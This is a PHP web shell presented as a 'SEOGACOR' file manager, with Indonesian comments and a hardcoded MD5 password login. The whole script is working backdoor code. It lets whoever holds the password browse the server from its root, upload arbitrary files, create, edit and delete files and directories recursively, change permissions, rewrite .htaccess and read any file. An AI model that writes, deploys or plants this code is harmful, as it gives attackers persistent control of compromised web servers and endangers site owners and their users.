<?php
session_start();

// Password hash (MD5) untuk autentikasi
$Pass = "668d3f3fa2bf0c6391483965d9fb9485";

// Cek apakah pengguna sudah login
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && md5($_POST['password']) === $Pass) {
        $_SESSION['logged_in'] = true;
    } else {
        // Jika tidak login, tampilkan formulir login
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login</title>
            <style>
                body { font-family: monospace, sans-serif; margin: 0; padding: 0; background: #000; color: #0f0; }
                form { margin: 100px auto; width: 300px; padding: 20px; border: 1px solid #0f0; background: #003300; }
                input[type="password"] { background: #003300; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; box-sizing: border-box; }
                input[type="submit"] { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; }
                p { color: #f00; }
            </style>
        </head>
        <body>
        <form method="post">
            <h1>Login</h1>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
        <?php if (isset($_POST['password']) && md5($_POST['password']) !== $Pass): ?>
            <p>Incorrect password. Please try again.</p>
        <?php endif; ?>
        </body>
        </html>
        <?php
        exit;
    }
}


// Mendapatkan root direktori dari server
$server_root = realpath('/');
$base_dir = $server_root;

// Mendapatkan direktori file ini
$this_file_dir = realpath(dirname(__FILE__));

// Mendapatkan direktori saat ini dari parameter query string
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $this_file_dir;

// Validasi dan sanitasi path direktori
if (strpos($dir, $base_dir) !== 0 || !is_dir($dir)) {
    $dir = $this_file_dir;
}

// Validasi dan sanitasi path untuk mencegah directory traversal
function sanitizePath($path, $base_dir) {
    $real_path = realpath($path);
    return ($real_path && strpos($real_path, $base_dir) === 0) ? $real_path : $base_dir;
}

// Menghapus direktori dan isinya
function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return unlink($dir); // Hapus file jika bukan direktori
    }
    foreach (new DirectoryIterator($dir) as $item) {
        if ($item->isDot()) continue;
        if ($item->isDir()) {
            deleteDirectory($item->getPathname()); // Hapus isi direktori
        } else {
            unlink($item->getPathname()); // Hapus file
        }
    }
    return rmdir($dir); // Hapus direktori setelah kosong
}

// Menangani unggahan file
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = '';

    // Menangani unggahan file
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $allowed_types = ['*']; // Mengizinkan semua tipe file
        $max_file_size = 50 * 1024 * 1024; // 50MB

        if ($_FILES['upload_file']['size'] > $max_file_size) {
            $message = 'File size exceeds limit.';
        } else {
            $upload_file = $dir . '/' . basename($_FILES['upload_file']['name']);
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_file)) {
                $message = 'File uploaded successfully!';
            } else {
                $message = 'Failed to upload file.';
            }
        }
    } elseif (isset($_FILES['upload_file'])) {
        $message = 'Upload error: ' . $_FILES['upload_file']['error'];
    }

    // Menangani pembuatan direktori baru
    if (isset($_POST['new_directory']) && !empty($_POST['new_directory'])) {
        $new_dir = $dir . '/' . basename($_POST['new_directory']);
        if (mkdir($new_dir)) {
            $message = 'Directory created successfully!';
        } else {
            $message = 'Failed to create directory.';
        }
    }

    // Menangani pembuatan file baru
    if (isset($_POST['new_file']) && !empty($_POST['file_content'])) {
        $new_file = $dir . '/' . basename($_POST['new_file']);
        if (file_put_contents($new_file, $_POST['file_content'])) {
            $message = 'File created successfully!';
        } else {
            $message = 'Failed to create file.';
        }
    }

    // Menangani Rename, Delete, Edit, Permissions
    if (isset($_POST['action'])) {
        $action = $_POST['action'];
        $path = isset($_POST['path']) ? sanitizePath($_POST['path'], $base_dir) : '';
        $rename_to = $_POST['rename_to'] ?? '';
        $file_content = $_POST['file_content'] ?? '';
        $chmod = $_POST['chmod'] ?? '';

        switch ($action) {
            case 'rename':
                if (!empty($path) && !empty($rename_to)) {
                    $rename_to = dirname($path) . '/' . basename($rename_to);
                    if (rename($path, $rename_to)) {
                        $message = 'Renamed successfully!';
                    } else {
                        $message = 'Failed to rename.';
                    }
                }
                break;

            case 'delete':
                if (!empty($path)) {
                    if (is_dir($path)) {
                        deleteDirectory($path);
                        $message = 'Directory deleted successfully!';
                    } elseif (is_file($path)) {
                        if (unlink($path)) {
                            $message = 'File deleted successfully!';
                        } else {
                            $message = 'Failed to delete file.';
                        }
                    }
                }
                break;

            case 'edit':
                if (!empty($path) && !empty($file_content)) {
                    if (file_put_contents($path, $file_content)) {
                        $message = 'File edited successfully!';
                    } else {
                        $message = 'Failed to edit file.';
                    }
                }
                break;

            case 'permissions':
                if (!empty($path) && !empty($chmod)) {
                    $chmod = intval($chmod, 8); // Konversi dari oktal ke desimal
                    if (chmod($path, $chmod)) {
                        $message = 'Permissions updated successfully!';
                    } else {
                        $message = 'Failed to update permissions.';
                    }
                }
                break;

            case 'edit_htaccess':
                $htaccess_file = $dir . '/.htaccess';
                $htaccess_content = $_POST['htaccess_content'] ?? '';

                if (file_put_contents($htaccess_file, $htaccess_content)) {
                    $message = '.htaccess file updated successfully!';
                } else {
                    $message = 'Failed to update .htaccess file.';
                }
                break;
        }
    }

    // Menangani penghapusan item yang dipilih
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'delete_selected') {
        if (isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
            foreach ($_POST['selected_items'] as $item) {
                $path = sanitizePath($item, $base_dir);
                if (file_exists($path)) {
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } elseif (is_file($path)) {
                        unlink($path);
                    }
                }
            }
            $message = 'Selected items deleted successfully!';
        } else {
            $message = 'No items selected for deletion.';
        }
    }
}

// Mendapatkan breadcrumb dari direktori
function getBreadcrumbs($base_dir, $current_dir) {
    $breadcrumbs = [];
    $current_dir = realpath($current_dir);

    while ($current_dir && $current_dir !== $base_dir) {
        $breadcrumbs[] = [
            'name' => basename($current_dir),
            'path' => $current_dir
        ];
        $current_dir = dirname($current_dir);
    }
    $breadcrumbs[] = ['name' => basename($base_dir), 'path' => $base_dir];
    $breadcrumbs = array_reverse($breadcrumbs);

    return array_map(function($breadcrumb) use ($current_dir) {
        // Tandai direktori saat ini
        $class = ($breadcrumb['path'] === $current_dir) ? 'current-directory' : 'directory';
        return '<a href="?dir=' . urlencode($breadcrumb['path']) . '" class="' . $class . '">' . htmlspecialchars($breadcrumb['name']) . '</a>';
    }, $breadcrumbs);
}

// Mendapatkan daftar direktori dan file termasuk file tersembunyi
$directories = [];
$files = [];
$breadcrumbs = getBreadcrumbs($base_dir, $dir);

// Mengambil dan menampilkan direktori
foreach (new DirectoryIterator($dir) as $fileInfo) {
    if ($fileInfo->isDot()) continue; // Skip . and ..
    if ($fileInfo->isDir()) {
        $directories[] = [
            'name' => '[' . $fileInfo->getFilename() . ']',
            'path' => $fileInfo->getPathname(),
            'permissions' => substr(sprintf('%o', $fileInfo->getPerms()), -4)
        ];
    } elseif ($fileInfo->isFile()) {
        $files[] = [
            'name' => $fileInfo->getFilename(),
            'path' => $fileInfo->getPathname(),
            'permissions' => substr(sprintf('%o', $fileInfo->getPerms()), -4)
        ];
    }
}

// Mendapatkan informasi tentang file yang sedang ditampilkan
$view_file = isset($_GET['view_file']) ? sanitizePath($_GET['view_file'], $base_dir) : '';
$file_content = '';
if ($view_file && is_file($view_file)) {
    $file_content = file_get_contents($view_file);
}

// Mendapatkan konten file .htaccess jika ada
$htaccess_content = '';
$htaccess_file = $dir . '/.htaccess';
if (file_exists($htaccess_file)) {
    $htaccess_content = file_get_contents($htaccess_file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEOGACOR- File Manager</title>
    <style>
        body { font-family: monospace, sans-serif; margin: 0; padding: 0; background: #000; color: #0f0; }
        h1 { color: #0f0; }
        p { color: #0f0; }
        table { width: 100%; border-collapse: collapse; }
        table, th, td { border: 1px solid #0f0; }
        th, td { padding: 8px; text-align: left; }
        th { background-color: #003300; }
        .current-directory { font-weight: bold; }
        .directory { margin-right: 10px; color: #0f0; }
        .file { margin-right: 10px; color: #0f0; }
        .file-content { white-space: pre-wrap; background: #003300; padding: 10px; color: #0f0; }
        .message { color: #0f0; }
        .error { color: #f00; }
        .hidden { display: none; }
        input[type="text"], textarea { background: #003300; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        input[type="submit"] { background: #0f0; color: #000; border: none; padding: 5px 10px; cursor: pointer; }
        input[type="file"] { background: #003300; color: #0f0; border: 1px solid #0f0; }
        input[type="checkbox"] { accent-color: #0f0; }
        a { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
    <script>
        // Menyimpan posisi scroll saat sebelum halaman dimuat
        window.addEventListener('beforeunload', function() {
            localStorage.setItem('scrollPosition', window.scrollY);
        });

        // Mengembalikan posisi scroll saat halaman dimuat
        window.addEventListener('load', function() {
            var scrollPosition = localStorage.getItem('scrollPosition');
            if (scrollPosition) {
                window.scrollTo(0, parseInt(scrollPosition, 10));
                localStorage.removeItem('scrollPosition');
            }
        });

        // Fungsi untuk centang semua checkbox
        function toggleSelectAll(source) {
            var checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            for (var checkbox of checkboxes) {
                checkbox.checked = source.checked;
            }
        }
    </script>
</head>
<body>

<h1>SEOGACOR- File Manager</h1>
<p><a href="?dir=<?php echo urlencode($this_file_dir); ?>">Home</a> &gt; <?php echo implode(' &gt; ', $breadcrumbs); ?></p>

<?php if (isset($message)): ?>
    <p class="message"><?php echo htmlspecialchars($message); ?></p>
<?php endif; ?>

<form action="" method="post" enctype="multipart/form-data">
    <h2>Upload File</h2>
    <input type="file" name="upload_file">
    <input type="submit" value="Upload">
</form>

<form action="" method="post">
    <h2>Create Directory</h2>
    <input type="text" name="new_directory" placeholder="Directory Name">
    <input type="submit" value="Create Directory">
</form>

<form action="" method="post">
    <h2>Create File</h2>
    <input type="text" name="new_file" placeholder="File Name">
    <textarea name="file_content" placeholder="File Content"></textarea>
    <input type="submit" value="Create File">
</form>

<form action="" method="post">
    <h2>Edit .htaccess</h2>
    <textarea name="htaccess_content" placeholder=".htaccess Content"><?php echo htmlspecialchars($htaccess_content); ?></textarea>
    <input type="submit" name="action" value="edit_htaccess">
</form>

<form action="" method="post">
    <h2>Files and Directories</h2>
    <table>
        <thead>
            <tr>
                <th><input type="checkbox" id="select-all" onclick="toggleSelectAll(this)"></th>
                <th>Name</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($directories as $directory): ?>
                <tr>
                    <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($directory['path']); ?>"></td>
                    <td><a href="?dir=<?php echo urlencode($directory['path']); ?>" class="directory"><?php echo htmlspecialchars($directory['name']); ?></a></td>
                    <td><?php echo htmlspecialchars($directory['permissions']); ?></td>
                    <td>
                        <form action="" method="post" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($directory['path']); ?>">
                            <input type="text" name="rename_to" placeholder="New Name">
                            <input type="submit" name="action" value="rename">
                        </form>
                        <form action="" method="post" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($directory['path']); ?>">
                            <input type="text" name="chmod" placeholder="Permissions (e.g., 755)">
                            <input type="submit" name="action" value="permissions">
                        </form>
                        <form action="" method="post" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($directory['path']); ?>">
                            <input type="submit" name="action" value="delete">
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
            <?php foreach ($files as $file): ?>
                <tr>
                    <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($file['path']); ?>"></td>
                    <td><a href="?dir=<?php echo urlencode($dir); ?>&view_file=<?php echo urlencode($file['path']); ?>" class="file"><?php echo htmlspecialchars($file['name']); ?></a></td>
                    <td><?php echo htmlspecialchars($file['permissions']); ?></td>
                    <td>
                        <form action="" method="post" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($file['path']); ?>">
                            <input type="text" name="rename_to" placeholder="New Name">
                            <input type="submit" name="action" value="rename">
                        </form>
                        <form action="" method="post" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($file['path']); ?>">
                            <input type="submit" name="action" value="delete">
                        </form>
                        <form action="" method="post" style="display:inline;">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($file['path']); ?>">
                            <input type="text" name="chmod" placeholder="Permissions (e.g., 755)">
                            <input type="submit" name="action" value="permissions">
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <input type="submit" name="action" value="delete_selected" onclick="return confirm('Are you sure you want to delete selected items?');">
</form>

<?php if ($view_file): ?>
    <h2>Viewing File: <?php echo htmlspecialchars(basename($view_file)); ?></h2>
    <div class="file-content"><?php echo htmlspecialchars($file_content); ?></div>
    <form action="" method="post">
        <input type="hidden" name="path" value="<?php echo htmlspecialchars($view_file); ?>">
        <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
        <input type="submit" name="action" value="edit">
    </form>
<?php endif; ?>

</body>
</html>